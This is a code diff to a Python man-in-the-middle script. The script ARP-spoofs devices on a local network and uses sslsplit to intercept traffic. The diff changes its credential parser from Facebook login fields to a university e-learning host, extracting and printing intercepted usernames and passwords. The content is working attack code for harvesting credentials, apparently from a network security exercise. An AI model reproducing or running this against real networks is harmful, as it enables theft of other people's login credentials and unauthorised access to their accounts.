@@ -69,12 +69,12 @@ def sslsplit():
         host = False
         for line in f.readlines():
             line = line.decode(errors="ignore")
-            if "Host: www.facebook.com" in line:
+            if "Host: e3.nycu.edu.tw" in line:
                 host = True
-            if host == True and "email" in line and "pass" in line:
+            if host == True and "username" in line and "password" in line:
                 user = line.split("&")
-                print("Email: ", user[2][6:])
-                print("Password: ", user[3][5:])
+                print("Username: ", user[1][9:])
+                print("Password: ", user[2][9:])
 
 def restore(destination_ip, source_ip):
     destination_mac = scan[destination_ip]
@@ -93,14 +93,14 @@ def main():
     gateway_ip, cidr = get_network_info()
     network = gateway_ip + "/" + str(cidr)
     scanning(network)
-    print_available_devices(gateway_ip)
+    #print_available_devices(gateway_ip)
 
     s = threading.Thread(target=sslsplit)
     s.daemon = True
     s.start()
 
     try:
-        print("ARP spoofing...")
+        print("ARP spoofing...\n")
         while True:
             for ip in scan.keys():
                 if ip != gateway_ip:
